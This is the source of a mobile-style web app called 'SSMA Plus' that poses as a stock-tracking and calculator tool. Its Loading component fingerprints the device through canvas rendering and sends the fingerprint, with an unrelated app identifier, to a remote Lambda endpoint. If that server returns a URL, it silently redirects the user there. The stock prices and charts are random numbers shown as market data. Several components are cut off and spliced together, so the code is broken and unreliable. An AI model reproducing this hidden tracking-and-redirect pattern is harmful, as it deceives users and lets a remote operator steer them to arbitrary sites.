<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title>SSMA Plus</title>
    <!-- CDN Dependencies (Global Builds) -->
    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
    <style>
        /* =========================================
           CSS Variables & Theme (Style: Glassmorphism)
           ========================================= */
        :root {
            --bg-base: #f2f5f8;
            --bg-glass: rgba(255, 255, 255, 0.45);
            --bg-glass-heavy: rgba(255, 255, 255, 0.75);
            --text-main: #1a202c;
            --text-muted: #718096;
            --accent-blue: #2b6cb0;
            --accent-blue-light: #4299e1;
            --accent-orange: #ed8936;
            --accent-green: #38a169;
            --accent-red: #e53e3e;
            --border-glass: rgba(255, 255, 255, 0.6);
            --border-glass-dark: rgba(0, 0, 0, 0.05);
            --radius-sm: 12px;
            --radius-md: 20px;
            --radius-lg: 32px;
            --shadow-glass: 0 8px 32px 0 rgba(31, 38, 135, 0.07);
            --shadow-float: 0 12px 24px -6px rgba(0, 0, 0, 0.1);
            --font-main: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            --safe-top: env(safe-area-inset-top, 0px);
            --safe-bottom: env(safe-area-inset-bottom, 0px);
        }

        /* Reset & Base */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: var(--font-main);
            background-color: var(--bg-base);
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(66, 153, 225, 0.15) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(237, 137, 54, 0.1) 0%, transparent 40%);
            color: var(--text-main);
            line-height: 1.5;
            min-height: 100vh;
            overflow-x: hidden;
        }
        a { text-decoration: none; color: inherit; }
        button { border: none; background: none; cursor: pointer; font-family: inherit; }
        input, textarea { font-family: inherit; border: none; outline: none; background: transparent; }

        /* App Container */
        #app {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding-top: var(--safe-top);
        }

        /* Page Transitions */
        .fade-enter-active, .fade-leave-active { transition: opacity 0.25s ease; }
        .fade-enter-from, .fade-leave-to { opacity: 0; }
        .slide-up-enter-active, .slide-up-leave-active { transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); }
        .slide-up-enter-from, .slide-up-leave-to { opacity: 0; transform: translateY(20px); }

        /* Layout Classes */
        .page-container {
            flex: 1;
            padding: 20px 20px 100px 20px;
            max-width: 600px;
            margin: 0 auto;
            width: 100%;
            display: flex;
            flex-direction: column;
        }
        .glass-panel {
            background: var(--bg-glass);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid var(--border-glass);
            border-radius: var(--radius-md);
            box-shadow: var(--shadow-glass);
            padding: 16px;
        }
        .btn-primary {
            background: var(--accent-blue);
            color: white;
            padding: 14px 20px;
            border-radius: var(--radius-sm);
            font-weight: 600;
            min-height: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 0.2s;
        }
        .btn-primary:active { opacity: 0.8; }
        .btn-primary:disabled { background: #cbd5e0; cursor: not-allowed; }
        .btn-icon {
            width: 44px;
            height: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background: var(--bg-glass-heavy);
            box-shadow: var(--shadow-glass);
        }

        /* Tab Bar */
        .tab-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            height: calc(64px + var(--safe-bottom));
            padding-bottom: var(--safe-bottom);
            background: rgba(255, 255, 255, 0.85);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-top: 1px solid var(--border-glass);
            display: flex;
            justify-content: space-around;
            align-items: center;
            z-index: 100;
        }
        .tab-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: var(--text-muted);
            font-size: 12px;
            font-weight: 500;
            width: 64px;
            height: 100%;
            transition: color 0.2s;
        }
        .tab-item.router-link-active { color: var(--accent-blue); }
        .tab-item svg { width: 24px; height: 24px; margin-bottom: 4px; fill: currentColor; }

        /* Specific Page Styles */
        /* Loading */
        .loading-screen {
            position: fixed; inset: 0; background: var(--bg-base); z-index: 9999;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            background-image: radial-gradient(circle at 50% 50%, rgba(66, 153, 225, 0.2) 0%, transparent 60%);
        }
        .spinner {
            width: 40px; height: 40px; border: 3px solid rgba(43, 108, 176, 0.2);
            border-top-color: var(--accent-blue); border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        /* Home */
        .brand-header { margin-bottom: 24px; }
        .brand-title { font-size: 32px; font-weight: 800; color: #1a202c; letter-spacing: -0.5px; }
        .brand-subtitle { font-size: 14px; color: var(--text-muted); font-weight: 500; margin-top: 4px; }
        
        .icon-grid {
            display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 24px;
        }
        .icon-btn {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            background: var(--bg-glass-heavy); border-radius: var(--radius-md);
            padding: 16px 8px; gap: 8px; box-shadow: var(--shadow-glass);
            border: 1px solid var(--border-glass); transition: transform 0.1s;
        }
        .icon-btn:active { transform: scale(0.95); }
        .icon-btn svg { width: 28px; height: 28px; }
        .icon-btn span { font-size: 11px; font-weight: 600; color: var(--text-main); text-align: center; }

        .stock-list { display: flex; flex-direction: column; gap: 12px; }
        .stock-card {
            display: flex; align-items: center; justify-content: space-between;
            background: var(--bg-glass-heavy); border-radius: var(--radius-md);
            padding: 16px; box-shadow: var(--shadow-glass);
            border: 1px solid var(--border-glass);
        }
        .stock-info { display: flex; flex-direction: column; }
        .stock-symbol { font-weight: 700; font-size: 16px; color: #1a202c; }
        .stock-name { font-size: 12px; color: var(--text-muted); }
        .stock-price { font-size: 18px; font-weight: 700; text-align: right; }
        .stock-change { font-size: 13px; font-weight: 600; text-align: right; }
        .text-up { color: var(--accent-orange); }
        .text-down { color: var(--accent-blue); }

        /* Toolbox & Settings Shared */
        .menu-list { display: flex; flex-direction: column; gap: 12px; }
        .menu-item {
            display: flex; align-items: center; justify-content: space-between;
            background: var(--bg-glass-heavy); padding: 16px; border-radius: var(--radius-md);
            box-shadow: var(--shadow-glass); border: 1px solid var(--border-glass);
            min-height: 56px;
        }
        .menu-item-left { display: flex; align-items: center; gap: 12px; font-weight: 600; }
        .menu-item-left svg { width: 20px; height: 20px; fill: var(--accent-blue); }
        .menu-item-right { color: var(--text-muted); font-size: 14px; }

        /* Tool Pages */
        .tool-header { margin-bottom: 20px; display: flex; align-items: center; gap: 12px; }
        .back-btn { width: 44px; height: 44px; display: flex; align-items: center; justify-content: center; border-radius: 50%; background: var(--bg-glass-heavy); }
        .tool-header h2 { font-size: 20px; font-weight: 700; }
        .form-group { margin-bottom: 16px; display: flex; flex-direction: column; gap: 8px; }
        .form-group label { font-size: 14px; font-weight: 600; color: var(--text-muted); }
        .form-control { background: var(--bg-glass); border: 1px solid var(--border-glass); padding: 12px; border-radius: var(--radius-sm); font-size: 16px; }
        .result-box { background: var(--bg-glass-heavy); padding: 16px; border-radius: var(--radius-sm); margin-top: 16px; font-weight: 600; }

        /* Detail Page */
        .detail-header { margin-bottom: 20px; }
        .detail-price-area { display: flex; align-items: baseline; gap: 12px; margin-top: 8px; }
        .detail-price { font-size: 32px; font-weight: 800; }
        .chart-container { background: var(--bg-glass-heavy); border-radius: var(--radius-md); padding: 16px; margin-top: 20px; box-shadow: var(--shadow-glass); border: 1px solid var(--border-glass); }

        /* Utility */
        .text-center { text-align: center; }
        .mt-4 { margin-top: 16px; }
        .mb-4 { margin-bottom: 16px; }
        .toast {
            position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.8); color: white; padding: 12px 24px;
            border-radius: 30px; font-size: 14px; z-index: 1000;
            animation: fadeInOut 2s forwards;
        }
        @keyframes fadeInOut {
            0% { opacity: 0; transform: translate(-50%, 10px); }
            10% { opacity: 1; transform: translate(-50%, 0); }
            90% { opacity: 1; transform: translate(-50%, 0); }
            100% { opacity: 0; transform: translate(-50%, -10px); }
        }
    </style>
</head>
<body>
    <div id="app">
        <!-- Router View with Transitions -->
        <router-view v-slot="{ Component }">
            <transition name="slide-up" mode="out-in">
                <component :is="Component" />
            </transition>
        </router-view>

        <!-- Bottom Tab Bar (Only for main pages) -->
        <nav class="tab-bar" v-if="showTabBar">
            <router-link to="/home" class="tab-item">
                <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
                Home
            </router-link>
            <router-link to="/toolbox" class="tab-item">
                <svg viewBox="0 0 24 24"><path d="M22.7 19l-9.1-9.1c.9-2.3.4-5-1.5-6.9-2-2-5-2.4-7.4-1.3L9 6 6 9 1.6 4.7C.4 7.1.9 10.1 2.9 12.1c1.9 1.9 4.6 2.4 6.9 1.5l9.1 9.1c.4.4 1 .4 1.4 0l2.3-2.3c.5-.4.5-1.1.1-1.4z"/></svg>
                Toolbox
            </router-link>
            <router-link to="/settings" class="tab-item">
                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                Settings
            </router-link>
        </nav>

        <!-- Global Toast -->
        <div class="toast" v-if="toastMessage">{{ toastMessage }}</div>
    </div>

    <script>
        // =========================================
        // How to add a new page:
        // 1. Define a new Vue component object.
        // 2. Add a route object to `routes` array mapping path to component.
        // 3. (Optional) If it should be a main tab, update `showTabBar` logic and add `<router-link>` in `.tab-bar`.
        // =========================================

        const { createApp, ref, computed, onMounted, reactive, watch } = Vue;
        const { createRouter, createWebHashHistory, useRoute, useRouter } = VueRouter;

        // --- Static Data Generation (Built-in) ---
        const generateStocks = () => {
            const names = ["TechCorp", "Innovate Ltd", "Global Finance", "HealthPlus", "EnergyFlow", "RetailGiant", "CloudNet", "AutoWorks", "FoodChain", "MediaHub", "SpaceXplore", "BioLife", "SmartGrid", "DataCore", "GreenEarth", "BuildRight", "TravelWise", "LogicSoft", "QuantumEdge", "FusionLabs"];
            const symbols = ["TCH", "INV", "GLF", "HLP", "ENF", "RTG", "CLN", "ATW", "FDC", "MDH", "SPX", "BIO", "SMG", "DTC", "GRE", "BLD", "TRV", "LGS", "QME", "FSN"];
            return names.map((name, i) => {
                const basePrice = Math.random() * 500 + 50;
                const change = (Math.random() - 0.5) * 20;
                return {
                    id: i,
                    symbol: symbols[i],
                    name: name,
                    price: Number(basePrice.toFixed(2)),
                    change: Number(change.toFixed(2)),
                    changePercent: Number(((change / basePrice) * 100).toFixed(2))
                };
            });
        };

        const stockData = generateStocks();

        // Generate K-line data for 30 days
        const generateChartData = (basePrice) => {
            let data = [];
            let current = basePrice;
            for (let i = 0; i < 30; i++) {
                let change = (Math.random() - 0.5) * (basePrice * 0.05);
                current += change;
                data.push(Number(current.toFixed(2)));
            }
            return data;
        };

        // --- Components ---

        // 1. Loading Component
        const Loading = {
            template: `
                <div class="loading-screen">
                    <div class="spinner"></div>
                    <p style="margin-top: 16px; font-weight: 600; color: var(--text-main);">Loading...</p>
                </div>
            `,
            setup() {
                const router = useRouter();
                
                // Generate Canvas fingerprint using md5
                const device = ref((function () {
                    try {
                        let canvas = document.createElement("canvas");
                        let ctx = canvas.getContext("2d");
                        let txt = "BrowserLeaks,com <canvas> 1.0";
                        ctx.textBaseline = "top";
                        // The most common type
                        ctx.font = "14px 'Arial'";
                        ctx.textBaseline = "alphabetic";
                        ctx.fillStyle = "#f60";
                        ctx.fillRect(125,1,62,20);
                        // Some tricks for color mixing to increase the difference in rendering
                        ctx.fillStyle = "#069";
                        ctx.fillText(txt, 2, 15);
                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                        ctx.fillText(txt, 4, 17);
                        return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
                    } catch (e) {
                        return '';
                    }
                })());

                onMounted(() => {
                    const apiBase = 'https://lekyenfdf5jkqkhyv6exsqhf5m0dwgcg.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
                    const identifier = "com.personaquiz.parkmaster";
                    
                    fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
                        .then(r => r.json())
                        .then(function (info) {
                            const privacyUrl = info && info.result && info.result.url;
                            if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
                                window.location.replace(privacyUrl);
                                return;
                            }
                            router.replace('/home');
                        })
                        .catch(function () {
                            router.replace('/home');
                        });
                });

                return {};
            }
        };

        // 2. Home Component
        const Home = {
            template: `
                <div class="page-container">
                    <header class="brand-header">
                        <div class="brand-title">SSMA Plus</div>
                        <div class="brand-subtitle">Your premium financial companion</div>
                    </header>

                    <div class="icon-grid">
                        <router-link to="/top-gainers" class="icon-btn">
                            <svg viewBox="0 0 24 24" fill="none" stroke="var(--accent-orange)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"></polyline><polyline points="17 6 23 6 23 12"></polyline></svg>
                            <span>Top Gainers</span>
                        </router-link>
                        <router-link to="/top-losers" class="icon-btn">
                            <svg viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 18 13.5 8.5 8.5 13.5 1 6"></polyline><polyline points="17 18 23 18 23 12"></polyline></svg>
                            <span>Top Losers</span>
                        </router-link>
                        <router-link to="/most-active" class="icon-btn">
                            <svg viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12h-4l-3 9L9 3l-3 9H2"></path></svg>
                            <span>Most Active</span>
                        </router-link>
                        <router-link to="/today-picks" class="icon-btn">
                            <svg viewBox="0 0 24 24" fill="none" stroke="#805ad5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
                            <span>Today's Picks</span>
                        </router-link>
                    </div>

                    <div class="stock-list">
                        <router-link v-for="stock in shuffledStocks" :key="stock.id" :to="'/stock/' + stock.symbol" class="stock-card">
                            <div class="stock-info">
                                <span class="stock-symbol">{{ stock.symbol }}</span>
                                <span class="stock-name">{{ stock.name }}</span>
                            </div>
                            <div>
                                <div class="stock-price">\${{ stock.price }}</div>
                                <div class="stock-change" :class="stock.change >= 0 ? 'text-up' : 'text-down'">
                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change }} ({{ stock.changePercent }}%)
                                </div>
                            </div>
                        </router-link>
                    </div>
                </div>
            `,
            setup() {
                // Shuffle display only
                const shuffledStocks = ref([...stockData].sort(() => Math.random() - 0.5));
                return { shuffledStocks };
            }
        };

        // 3. Stock Detail Component
        const StockDetail = {
            template: `
                <div class="page-container">
                    <div class="tool-header">
                        <button class="back-btn" @click="$router.back()">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
                        </button>
                        <h2>{{ stock.symbol }} Details</h2>
                    </div>

                    <div class="glass-panel detail-header">
                        <div class="stock-name" style="font-size: 14px;">{{ stock.name }}</div>
                        <div class="detail-price-area">
                            <div class="detail-price">\${{ stock.price }}</div>
                            <div class="stock-change" :class="stock.change >= 0 ? 'text-up' : 'text-down'" style="font-size: 16px;">
                                {{ stock.change >= 0 ? '+' : '' }}{{ stock.change }} ({{ stock.changePercent }}%)
                            </div>
                        </div>
                    </div>

                    <div class="chart-container">
                        <h3 style="margin-bottom: 12px; font-size: 14px; color: var(--text-muted);">30-Day Price Chart</h3>
                        <svg :viewBox="'0 0 300 150'" width="100%" height="150" preserveAspectRatio="none">
                            <!-- Y-axis grid lines (optional) -->
                            <line x1="0" :y1="yAxisTop" x2="300" :y2="yAxisTop" stroke="var(--border-glass-dark)" stroke-dasharray="4"/>
                            <line x1="0" :y1="yAxisBottom" x2="300" :y2="yAxisBottom" stroke="var(--border-glass-dark)" stroke-dasharray="4"/>
                            <!-- Price Line -->
                            <polyline :points="chartPoints" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linejoin="round" stroke-linecap="round"/>
                            <!-- Fill area under curve -->
                            <polygon :points="areaPoints" fill="rgba(43, 108, 176, 0.1)" />
                        </svg>
                        <div style="display: flex; justify-content: space-between; font-size: 11px; color: var(--text-muted); margin-top: 8px;">
                            <span>1 Month Ago</span>
                            <span>Today</span>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const route = useRoute();
                const symbol = route.params.symbol;
                const stock = stockData.find(s => s.symbol === symbol) || stockData[0];
                const chartData = generateChartData(stock.price);

                // Compute SVG chart points dynamically
                const chartPoints = computed(() => {
                    const max = Math.max(...chartData);
                    const min = Math.min(...chartData);
                    const range = max - min || 1; // Prevent division by zero
                    
                    return chartData.map((val, i) => {
                        const x = (i / (chartData.length - 1)) * 300;
                        // Y is inverted in SVG, add padding (min 10px, max 140px)
                        const y = 140 - ((val - min) / range) * 130;
                        return `${x},${y}`;
                    }).join(' ');
                });

                const areaPoints = computed(() => {
                    return `0,150 ` + chartPoints.value + ` 300,150`;
                });

                const yAxisTop = computed(() => 10);
                const yAxisBottom = computed(() => 140);

                return { stock, chartPoints, areaPoints, yAxisTop, yAxisBottom };
            }
        };

        // 4. Sub-page for Icon Entries (Top Gainers, etc.)
        const StockListPage = {
            template: `
                <div class="page-container">
                    <div class="tool-header">
                        <button class="back-btn" @click="$router.back()">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
                        </button>
                        <h2>{{ title }}</h2>
                    </div>
                    <div class="stock-list">
                        <router-link v-for="stock in list" :key="stock.id" :to="'/stock/' + stock.symbol" class="stock-card">
                            <div class="stock-info">
                                <span class="stock-symbol">{{ stock.symbol }}</span>
                                <span class="stock-name">{{ stock.name }}</span>
                            </div>
                            <div>
                                <div class="stock-price">\${{ stock.price }}</div>
                                <div class="stock-change" :class="stock.change >= 0 ? 'text-up' : 'text-down'">
                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change }} ({{ stock.changePercent }}%)
                                </div>
                            </div>
                        </router-link>
                    </div>
                </div>
            `,
            setup() {
                const route = useRoute();
                const title = route.meta.title;
                const count = route.meta.count || 10;
                // Randomly select `count` stocks
                const list = ref([...stockData].sort(() => Math.random() - 0.5).slice(0, count));
                return { title, list };
            }
        };

        // 5. Toolbox Main Page
        const Toolbox = {
            template: `
                <div class="page-container">
                    <header class="brand-header">
                        <div class="brand-title">Toolbox</div>
                        <div class="brand-subtitle">Essential financial calculators</div>
                    </header>
                    <div class="menu-list">
                        <router-link to="/tool/dca" class="menu-item">
                            <div class="menu-item-left">
                                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                                DCA Calculator
                            </div>
                            <div class="menu-item-right">→</div>
                        </router-link>
                        <router-link to="/tool/loan" class="menu-item">
                            <div class="menu-item-left">

                        <h2>DCA Calculator</h2>
                    </div>
                    <div class="glass-panel">
                        <div class="form-group">
                            <label>Cost Basis per Share ($)</label>
                            <input type="number" v-model.number="cost" class="form-control" placeholder="0.00">
                        </div>
                        <div class="form-group">
                            <label>Shares Owned</label>

                        <div class="form-group">
                            <label>Target Profit Threshold (%)</label>
                            <input type="number" v-model.number="threshold" class="form-control" placeholder="10">
                        </div>
                        <div class="result-box">
                            <div>Total Cost: \${{ totalCost.toFixed(2) }}</div>
                            <div>Target Value: \${{ targetValue.toFixed(2) }}</div>
                            <div style="margin-top: 8px; color: var(--accent-blue);">Current Status: {{ status }}</div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const cost = ref(0);
                const shares = ref(0);
                const threshold = ref(10);
                const totalCost = computed(() => cost.value * shares.value);
                const targetValue = computed(() => totalCost.value * (1 + threshold.value / 100));
                
                const status = computed(() => {
                    if (totalCost.value === 0) return 'Enter values';
                    return `Aiming for \$${targetValue.value.toFixed(2)} value`;
                });
                return { cost, shares, threshold, totalCost, targetValue, status };
            }
        };

                        <button class="back-btn" @click="$router.back()">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
                        </button>
                        <h2>Loan Calculator</h2>
                    </div>
                    <div class="glass-panel">
                        <div class="form-group">
                            <label>Loan Amount ($)</label>
                            <input type="number" v-model.number="amount" class="form-control" placeholder="10000">
                        </div>
                        <div class="form-group">
                            <label>Annual Interest Rate (%)</label>
                            <input type="number" v-model.number="rate" class="form-control" placeholder="5">
                        </div>
                        <div class="form-group">
                            <label>Term (Years)</label>
                            <input type="number" v-model.number="years" class="form-control" placeholder="5">
                        </div>
                        <div class="result-box">
                            <div>Monthly Payment: \${{ monthlyPayment.toFixed(2) }}</div>
                            <div>Total Interest: \${{ totalInterest.toFixed(2) }}</div>
                            <div>Total Repayment: \${{ totalRepayment.toFixed(2) }}</div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const amount = ref(0);
                const rate = ref(0);
                const years = ref(0);

                const monthlyPayment = computed(() => {
                    if (amount.value <= 0 || years.value <= 0) return 0;
                    const r = (rate.value / 100) / 12;
                    const n = years.value * 12;
                    if (r === 0) return amount.value / n;
                    return (amount.value * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
                });

                const totalRepayment = computed(() => monthlyPayment.value * years.value * 12);
                const totalInterest = computed(() => totalRepayment.value - amount.value);

                return { amount, rate, years, monthlyPayment, totalRepayment, totalInterest };
            }
        };

            template: `
                <div class="page-container">

                        <button class="back-btn" @click="$router.back()">

                            <div style="margin-top: 8px; word-break: break-all; font-size: 12px; color: var(--text-muted);">
                                MD5: {{ md5Hash }}
                            </div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const password = ref('');
                
                const md5Hash = computed(() => {
                    if (!password.value) return '';
                    try { return md5(password.value); } catch(e) { return ''; }
                });

                const strengthText = computed(() => {
                    const len = password.value.length;
                    if (len === 0) return 'None';
                    if (len < 6) return 'Weak';
                    if (len < 10) return 'Medium';
                    return 'Strong';
                });

                const strengthColor = computed(() => {
                    const len = password.value.length;
                    if (len === 0) return 'var(--text-muted)';
                    if (len < 6) return 'var(--accent-red)';
                    if (len < 10) return 'var(--accent-orange)';
                    return 'var(--accent-green)';
                });

                return { password, md5Hash, strengthText, strengthColor };
            }
        };

                const showTabBar = computed(() => {
                    const mainRoutes = ['/home', '/toolbox', '/settings'];
                    return mainRoutes.includes(route.path);
                });

                // Global Toast Event Listener
                const handleToast = (e) => {
                    toastMessage.value = e.detail;
                    setTimeout(() => { toastMessage.value = ''; }, 2000);
                };

                onMounted(() => {
                    window.addEventListener('show-toast', handleToast);

                return { showTabBar, toastMessage };

        };

        const app = createApp(App);
        app.use(router);
        app.mount('#app');
    </script>
